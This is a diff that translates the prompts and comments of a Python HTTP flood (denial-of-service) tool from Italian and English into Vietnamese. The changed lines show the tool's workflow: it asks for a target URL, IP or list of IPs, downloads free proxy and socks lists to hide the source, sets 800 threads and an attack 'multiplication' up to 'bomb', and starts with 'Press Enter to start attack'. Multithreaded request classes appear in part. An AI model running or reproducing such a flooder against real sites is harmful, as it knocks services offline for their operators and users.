@@ -23,7 +23,8 @@ print('''
 
 
 							C0d3d by All3xJ
-	''') # la grafica ci sta
+						       Đậu Đậu việt hóa
+	''') # đồ họa ở đó
 
 
 
@@ -459,26 +460,26 @@ useragents=["AdsBot-Google ( http://www.google.com/adsbot.html)",
 			]
 
 
-def starturl(): # in questa funzione setto l'url per renderlo usabile per il futuro settaggio delle richieste HTTP.
+def starturl(): # trong chức năng này, tôi đặt url để làm cho nó có thể sử dụng được cho việc thiết lập các yêu cầu HTTP trong tương lai.
 	global url
 	global url2
 	global urlport
 	global choice1
 	global ips
 
-	choice1 = input("\nDo you want one target [0] or more[1] > ")
+	choice1 = input("\nBạn có muốn một mục tiêu [0] hoặc nhiều hơn [1] > ")
 
 	if choice1 == "1":
-		ip_file = input("Insert txt file of ips > ")
+		ip_file = input("Chèn tệp txt của ips > ")
 		ips = open(ip_file).readlines()
 
 
 
 	else:
-		url = input("\nInsert URL/IP: ").strip()
+		url = input("\nChèn URL / IP: ").strip()
 
 		if url == "":
-			print ("Please enter the url.")
+			print ("Vui lòng nhập url.")
 			starturl()
 
 		try:
@@ -489,7 +490,7 @@ def starturl(): # in questa funzione setto l'url per renderlo usabile per il fut
 			else:
 				url = "http://" + url
 		except:
-			print("You mistyped, try again.")
+			print("Bạn đã nhập sai, hãy thử lại.")
 			starturl()
 
 		try:
@@ -507,7 +508,7 @@ def starturl(): # in questa funzione setto l'url per renderlo usabile per il fut
 
 def proxymode():
 	global choice2
-	choice2 = input("Do you want proxy/socks mode? Answer 'y' to enable it: ")
+	choice2 = input("Bạn có muốn chế độ proxy / vớ không? Trả lời 'y' để kích hoạt nó: ")
 	if choice2 == "y":
 		choiceproxysocks()
 	else:
@@ -515,17 +516,17 @@ def proxymode():
 
 def choiceproxysocks():
 	global choice3
-	choice3 = input("Type '0' to enable proxymode or type '1' to enable socksmode: ")
+	choice3 = input("Nhập '0' để bật chế độ proxy hoặc nhập '1' để bật chế độ bít tất: ")
 	if choice3 == "0":
 		choicedownproxy()
 	elif choice3 == "1":
 		choicedownsocks()
 	else:
-		print ("You mistyped, try again.")
+		print ("Bạn đã nhập sai, hãy thử lại.")
 		choiceproxysocks()
 
 def choicedownproxy():
-	choice4 = input("Do you want to download a new list of proxy? Answer 'y' to do it: ")
+	choice4 = input("Bạn có muốn tải xuống danh sách proxy mới không? Trả lời 'y' để làm điều đó: ")
 	if choice4 == "y":
 		urlproxy = "http://free-proxy-list.net/"
 		proxyget(urlproxy)
@@ -533,7 +534,7 @@ def choicedownproxy():
 		proxylist()
 
 def choicedownsocks():
-	choice4 = input("Do you want to download a new list of socks? Answer 'y' to do it: ")
+	choice4 = input("Bạn có muốn tải xuống danh sách tất mới không? Trả lời 'y' để làm điều đó: ")
 	if choice4 == "y":
 		urlproxy = "https://www.socks-proxy.net/"
 		proxyget(urlproxy)
@@ -560,14 +561,14 @@ def proxyget(urlproxy): # lo dice il nome, questa funzione scarica i proxies
 		out_file.write("")
 		out_file.write(proxies)
 		out_file.close()
-		print ("Proxies downloaded successfully.")
-	except: # se succede qualche casino
-		print ("\nERROR!\n")
-	proxylist() # se va tutto liscio allora prosegue eseguendo la funzione proxylist()
+		print ("Đã tải proxy thành công.")
+	except: # nếu có bất kỳ sự lộn xộn nào xảy ra
+		print ("\nLỖI!\n")
+	proxylist() # nếu mọi thứ suôn sẻ thì hãy tiếp tục chạy hàm proxylist ()
 
 def proxylist():
 	global proxies
-	out_file = str(input("Enter the proxylist filename/path (proxy.txt): "))
+	out_file = str(input("Nhập tên tệp / đường dẫn của danh sách proxy (proxy.txt): "))
 	if out_file == "":
 		out_file = "proxy.txt"
 	proxies = open(out_file).readlines()
@@ -576,23 +577,23 @@ def proxylist():
 def numthreads():
 	global threads
 	try:
-		threads = int(input("Insert number of threads (800): "))
+		threads = int(input("Chèn số lượng chủ đề (800): "))
 	except ValueError:
 		threads = 800
-		print ("800 threads selected.\n")
+		print ("800 chủ đề được chọn.\n")
 	multiplication()
 
 def multiplication():
 	global multiple
 	try:
-		multiple = int(input("Insert a number of multiplication for the attack [(1-5=normal)(50=powerful)(100 or more=bomb)]: "))
+		multiple = int(input("Chèn một số phép nhân cho cuộc tấn công [(1-5 = bình thường) (50 = mạnh) (100 trở lên = bom)]: "))
 	except ValueError:
-		print("You mistyped, try again.\n")
+		print("Bạn đã nhập sai, hãy thử lại.\n")
 		multiplication()
 	begin()
 
 def begin():
-	choice6 = input("Press 'Enter' to start attack: ")
+	choice6 = input("Nhấn 'Enter' để bắt đầu tấn công: ")
 	if choice6 == "":
 		loop()
 	elif choice6 == "Enter": #lool
@@ -734,8 +735,7 @@ class RequestSocksHTTP(threading.Thread): # la classe del multithreading
 					print ("Sock down. Retrying request. @", self.counter)
 					s.close() # se nemmeno con quel try si e' riuscito a inviare niente, allora il sock e' down e chiude il socket.
 
-class RequestDefaultHTTP(threading.Thread): # la classe del multithreading
-
+class RequestDefaultHTTP(threading.Thread): # lớp đa luồng
 	def __init__(self, counter): # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
 		threading.Thread.__init__(self)
 		self.counter = counter
@@ -766,4 +766,4 @@ class RequestDefaultHTTP(threading.Thread): # la classe del multithreading
 
 
 if __name__ == '__main__':
-	starturl() # questo fa startare la prima funzione del programma, che a sua volta ne starta un altra, poi un altra, fino ad arrivare all'attacco.
+	starturl() # chức năng này bắt đầu chức năng đầu tiên của chương trình, lần lượt bắt đầu chức năng khác, sau đó bắt đầu chức năng khác, cho đến khi nó đạt đến cuộc tấn công.
